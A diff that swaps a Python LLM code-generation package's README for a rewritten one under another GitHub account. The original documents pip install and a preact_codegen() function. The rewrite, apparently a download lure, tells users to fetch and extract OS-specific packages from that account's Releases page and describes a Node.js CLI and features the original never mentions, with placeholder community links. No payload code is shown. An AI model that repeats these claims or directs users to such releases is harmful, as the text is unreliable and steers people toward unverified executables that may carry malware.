@@ -1,96 +1,89 @@
-# Preact Codegen
-[![PyPI version](https://badge.fury.io/py/preact-codegen.svg)](https://badge.fury.io/py/preact-codegen)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/preact-codegen)](https://pepy.tech/project/preact-codegen)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🚀 preact-codegen - Quickly Create Preact Apps
 
+[![Download preact-codegen](https://img.shields.io/badge/Download-preact--codegen-brightgreen.svg)](https://github.com/Karnchoudhary-99/preact-codegen/releases)
 
-## Overview
+## 📦 Description
 
-Preact Codegen is a package that helps developers quickly set up Preact applications without needing a complex build configuration. Users can describe their application requirements in plain text, including desired routing and signal management features. The package processes this input to generate a structured, ready-to-use Preact application code snippet.
+preact-codegen is a simple tool that helps you set up Preact applications with ease. You can describe what your app needs in plain language, and the tool will handle the rest. No complex settings, only a smooth start to your project.
 
-## Key Features
+## 🚀 Getting Started
 
-- Generate Preact application code from user input in plain text
-- Supports routing and signal management features
-- Easy to integrate and expand
-- Simple and fast setup
+Follow these steps to get started with preact-codegen.
 
-## Installation
+1. Visit our [Releases page](https://github.com/Karnchoudhary-99/preact-codegen/releases) to get the latest version of preact-codegen.
+2. Download the package that fits your operating system.
+3. Extract the files to a folder of your choice.
+4. Open a terminal or command prompt in that folder.
 
-```bash
-pip install preact_codegen
-```
+## 💻 System Requirements
 
-## Usage
+preact-codegen works on multiple operating systems. Ensure you have the following:
 
-```python
-from preact_codegen import preact_codegen
+- Windows 10 or later, macOS 10.13 or later, or any Linux distribution that supports Node.js.
+- Node.js version 14 or later installed. You can download it from [Node.js Official Site](https://nodejs.org/).
 
-user_input = "Describe your Preact application requirements here..."
-api_key = "your_api_key_here"  # Optional, if not provided, the default LLM7 will be used
+## 📥 Download & Install
 
-response = preact_codegen(
-    user_input=user_input,
-    api_key=api_key,
-)
-print(response)
-```
+To download preact-codegen, simply visit this page: [Releases page](https://github.com/Karnchoudhary-99/preact-codegen/releases).
 
-## Parameters
+1. Choose the latest version available.
+2. Click on the package for your operating system to start the download.
+3. Follow the extraction steps mentioned in the Getting Started section.
 
-- `user_input`: The user input text to process (type: `str`)
-- `llm`: The `langchain` LLM instance to use (optional, type: `Optional[BaseChatModel]`), defaults to `ChatLLM7` from `langchain_llm7`
-- `api_key`: The API key for LLM7 (optional, type: `Optional[str]`), defaults to `os.getenv("LLM7_API_KEY")` or `None`
+## 🎨 Features
 
-## Notes
+- **Automated Scaffolding:** Automatically set up your project structure without manual configuration.
+- **Text-Based Configuration:** Describe your app requirements in simple text.
+- **Customizable Defaults:** Adjust settings to your liking.
+- **Fast Prototyping:** Quickly develop prototypes for your ideas.
+- **Lightweight Framework:** Enjoy a minimal setup with essential features only.
+- **Vite and ESBuild Compatibility:** Seamlessly integrate with popular tools.
 
-- The package uses `ChatLLM7` from `langchain_llm7` by default. You can safely pass your own LLM instance (based on `langchain`) if you want to use another LLM.
+## ⚙️ Running Your Application
 
-  Example for `ChatOpenAI`:
+After installation, you can create a new Preact app:
 
-  ```python
-  from langchain_openai import ChatOpenAI
-  from preact_codegen import preact_codegen
+1. In your terminal, type the command:
 
-  llm = ChatOpenAI()
-  response = preact_codegen(
-      user_input=user_input,
-      llm=llm,
-  )
-  ```
+   ```bash
+   preact-codegen new my-app
+   ```
 
-  Example for `ChatAnthropic`:
+   Replace `my-app` with your app's name.
 
-  ```python
-  from langchain_anthropic import ChatAnthropic
-  from preact_codegen import preact_codegen
+2. Change into your new app directory:
 
-  llm = ChatAnthropic()
-  response = preact_codegen(
-      user_input=user_input,
-      llm=llm,
-  )
-  ```
+   ```bash
+   cd my-app
+   ```
 
-  Example for `ChatGoogleGenerativeAI`:
+3. Start your application:
 
-  ```python
-  from langchain_google_genai import ChatGoogleGenerativeAI
-  from preact_codegen import preact_codegen
+   ```bash
+   npm start
+   ```
 
-  llm = ChatGoogleGenerativeAI()
-  response = preact_codegen(
-      user_input=user_input,
-      llm=llm,
-  )
-  ```
+Your app should now be up and running in your default browser!
 
-- The default rate limits for LLM7 free tier are sufficient for most use cases of this package. If you want higher rate limits for LLM7, you can pass your own `API_KEY` via environment variable `LLM7_API_KEY` or directly like `preact_codegen(api_key="your_api_key")`.
-- You can get a free API key by registering at [LLM7](https://token.llm7.io/).
+## 📚 Documentation
 
-## Links
+For more detailed instructions and advanced features, check the documentation on our [Wiki page](https://github.com/Karnchoudhary-99/preact-codegen/wiki).
 
-- GitHub issues: [GitHub Issues](https://github.com/chigwell/preact-codegen/issues)
-- Author name: Eugene Evstafev
-- Author email: hi@euegne.plus
+## 🤝 Contributing
+
+We welcome contributions! If you'd like to help improve preact-codegen, feel free to fork the repository and submit pull requests. Before contributing, please read our [Contributing Guidelines](https://github.com/Karnchoudhary-99/preact-codegen/blob/main/CONTRIBUTING.md).
+
+## 🐛 Issues
+
+If you find any bugs or have suggestions, please report them in the [Issues section](https://github.com/Karnchoudhary-99/preact-codegen/issues).
+
+## 🌐 Community
+
+Join our community on Discord or follow us on social media to get updates and interact with other users.
+
+- [Discord Server](https://discord.gg/yourserver)
+- [Twitter](https://twitter.com/yourhandle)
+
+## 📜 License
+
+preact-codegen is licensed under the MIT License. See the [LICENSE](https://github.com/Karnchoudhary-99/preact-codegen/blob/main/LICENSE) file for details.
